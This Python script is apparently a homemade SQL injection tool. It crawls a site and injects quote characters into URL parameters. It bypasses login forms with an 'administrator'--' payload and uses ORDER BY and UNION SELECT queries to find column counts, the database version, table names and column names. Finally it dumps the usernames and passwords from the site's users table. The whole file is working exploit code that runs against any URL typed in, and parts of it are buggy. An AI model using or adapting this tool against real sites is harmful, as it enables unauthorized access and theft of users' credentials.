import requests
from bs4 import BeautifulSoup
import scanner
import urllib.parse as urlparse
import re
import urllib.parse
url = ""

users_table="" ;username_column="";password_column="";url1="";url2="";no_column = "";string_field=[];comment = ""
#vuln_scan = scanner.Scanner(url, [])
def extract_forms(url,vuln_scan):
    response = vuln_scan.session.get(url)
    parsed_html = BeautifulSoup(response.content, "lxml")
    return parsed_html.find("form")

def sql_in_whereclause(vuln_scan):
    for link in vuln_scan.target_links :
        if "=" in link :
            link1 = link.split("=")[0]
            url_join = urlparse.urljoin(link1,"='")
            r=requests.get(url_join)
            if r.status_code != 200 :
                print("**************************************************************************")
                print("Sql injection discover in:",link)
                try:
                   column_number(link)
                   administrator_password(link)
                except:
                    print("Not Found")
def sql_in_login(link,vuln_scan):
        """for link in vuln_scan.target_links:
                login_list = ["login","account","Login"]
                for list in login_list:
                    if list in link :"""
        form = extract_forms(link,vuln_scan)
        action = form.get("action")
        post_url = urlparse.urljoin(url, action)
        post_data1 = {}
        inputs_list1 = form.find_all("input")
        for input in inputs_list1:
            input_name = input.get("name")
            input_type = input.get("type")
            input_value = input.get("value")
            if input_type == "username":
                input_value = "administrator"
            elif input_type == "password":
                input_value = "'"
            post_data1[input_name] = input_value
        post1 = vuln_scan.session.post(post_url, data=post_data1)
        #print(post_data1)
        #print(str(post1.status_code)+post1.text)
        if "Internal Server Error" in post1.text :
                print("Sql injection in login page is discovered in: " + post_url+ " in password field")
        else :
            print("Sql injection in login page is not discovered in password field")
        inputs_list = form.find_all("input")
        post_data = {}
        for input in inputs_list:
            input_name = input.get("name")
            input_type = input.get("type")
            input_value = input.get("value")
            if input_type == "username" :
                input_value = "administrator'--"
            elif input_type == "password" :
                input_value = "1234asdf"
            post_data[input_name] = input_value
        post = vuln_scan.session.post(post_url, data=post_data)
        if "Log out" in post.text :
            print("Sql injection in login page is discovered in:"+post_url+"in username field")
            print("You are logged in as administrator.....")
        else :
            print("Sql injection in login page is not discovered in username field")


def column_number(url) :
    global no_column
    num = 0
    r = requests.get(url)
    while(r.status_code == 200 or r1.status_code == 200):
        num += 1
        r=requests.get(url+urllib.parse.quote("'ORDER BY "+str(num)+"--"))
        r1=requests.get(url+urllib.parse.quote("'ORDER BY "+str(num)+"#"))
    print("The number of columns returned by the query :"+  str(num-1))
    no_column = num-1
    find_string_field(url,num-1)

def find_string_field(url,num_colum):
    global string_field,comment,url1,url2
    comment_list = ["--","#"]
    db = " "
    for i in range(1,num_colum+1,1):
        string = "'ajantha'"
        payload = ['null'] * num_colum
        payload[i-1] = string
        for list in comment_list :
             r= requests.get(url + urllib.parse.quote("' union select " + ','.join(payload) + list))
             if r.status_code == 200 :
                  comment = list
                  url1 = url + urllib.parse.quote("' union select " + ','.join(payload) + list)
                  r1 = requests.get(url1)
                  if string.strip('\'') in r1.text:
                      string_field.append(str(i))
                      db = url1
             else :
                 comment = "--" #for oracle db
        url2 = url + urllib.parse.quote("' union select " +','.join(payload) +" from dual" + "--")
        repl_url = url2.replace("%27ajantha%27", "banner")
        repl_url = repl_url.replace("dual", "v$version")

        r2 = requests.get(url2)
        r4 = requests.get(repl_url)

        if string.strip('\'') in r2.text :
            string_field.append(str(i))

    print("String field in column number :" + ",".join(string_field))
    if db == url1 :
       db_version = database_version(db)
       print("Database version :" + db_version)
    elif r2.status_code == 200 :
        print("Database Name : Oracle")
        if "Oracle Database" in r4.text :
            print("Database version :" + re.findall('Oracle\sDatabase.*', r4.text)[0])
        else :
            print("Database version :Not Found")
        table_names(repl_url)

def database_version(url):
    database_list = ["@@version","version()"]
    for list in database_list:
        version_url = url.replace("%27ajantha%27",list)
        r = requests.get(version_url)
        soup = BeautifulSoup(r.text, 'html.parser')
        if r.status_code == 200 :
            if list == "@@version" :
               print("Database Name : Microsoft,Mysql")
               table_names(version_url)
               return (soup.find(text=re.compile('.*\d{1,2}.\d{1,2}.\d{1,2}.*')))

            elif list =="version()" :
               print("Database Name : PostgreSql")
               table_names(version_url)
               #administrator_password(url)
               return (soup.find(text=re.compile('.*\d{1,2}.\d{1,2}.\d{1,2}.*')))

def table_names(url):
    global users_table
    if "@@version" in url :
        url = url.replace("@@version","table_name")
    elif "version()" in url :
        url = url.replace("version()", "table_name")
    elif "v$version" in url :
        url = url.replace("v$version", "all_tables")
        url = url.replace("banner","table_name")
    table = urllib.parse.quote(" FROM information_schema.tables"+comment)
    if "from" not in url :
        url = url.replace(comment,table)
    r = requests.get(url)
    soup = BeautifulSoup(r.text,'html.parser')
    if "users" in r.text :
        users_table = soup.find(text=re.compile('.*users.*'))
    elif "USERS" in r.text :
        users_table = soup.find(text=re.compile('^USERS\_.*'))
    else :
        users_table = "Not Found"
    print("Users table name : " + users_table)
    column_name(url,users_table)

def column_name(url,users_table):
    global username_column,password_column
    url = url.replace("table_name","column_name")
    url = url.replace("tables","columns")
    table = urllib.parse.quote(" WHERE table_name = '"+users_table+"'"+comment)
    if "all_columns" in url :
        url = url.replace("all_columns","all_tab_columns")
    url = url.replace(comment,table)
    r = requests.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    if "username" in r.text and "password" in r.text:
      username_column = soup.find(text=re.compile('.*username.*'))
      password_column = soup.find(text=re.compile('.*password.*'))
    elif "USERNAME" in r.text and "PASSWORD" in r.text :
        username_column = soup.find(text=re.compile('.*USERNAME.*'))
        password_column = soup.find(text=re.compile('.*PASSWORD.*'))
    else :
        username_column = "Not Found"
        password_column = "Not Found"
    print("username_column : "+username_column)
    print("password_column : "+password_column)
def administrator_password(url):
    payload = ['null'] * no_column
    payload[no_column-2] = username_column
    payload[no_column- 1] = password_column
    new_url = (url + urllib.parse.quote("' union select " + ','.join(payload)))
    new_url = new_url + urllib.parse.quote(" from "+users_table+comment)
    r = requests.get(new_url)
    password = re.findall('(?:<th>)(.*?)</th>',str(r.content))
    password1 = re.findall('(?:<td>)(.*?)</td>',str(r.content))
    print("USERNAME\t\t\tPASSWORD\n###############################################################################")
    username_list =[];password_list =[]
    for list in password :
        if len(list) < 20 and " " not in list:
            username_list.append(list)
            #print(list)
    for list in password1 :
        list=list.strip()
        if " " not in list :
            password_list.append(list)
            #print(list)
    if len(username_list)==len(password_list) :
        for i in range(0,len(username_list),1)    :
         print(username_list[i],end="")
         print("\t\t\t"+password_list[i]+"\n")
    else :
        print(username_list)
        print(password_list)
    print("***************************************************************************")


def main():
    url = input("Enter the url : ")
    vuln_scan = scanner.Scanner(url, [])
    vuln_scan.crawl()
    login = input("Do you want to check sql injection in login page :(yes/no)")
    if login == "yes" :
        print("The Url of login page might be :")
        for link in vuln_scan.target_links:
                login_list = ["login","account","Login"]
                for list in login_list:
                    if list in link :
                        print(link)
        login_url = input("Enter the url of login page :")
        sql_in_login(login_url,vuln_scan)
    sql_in_whereclause(vuln_scan)
if __name__ == '__main__':
    main()
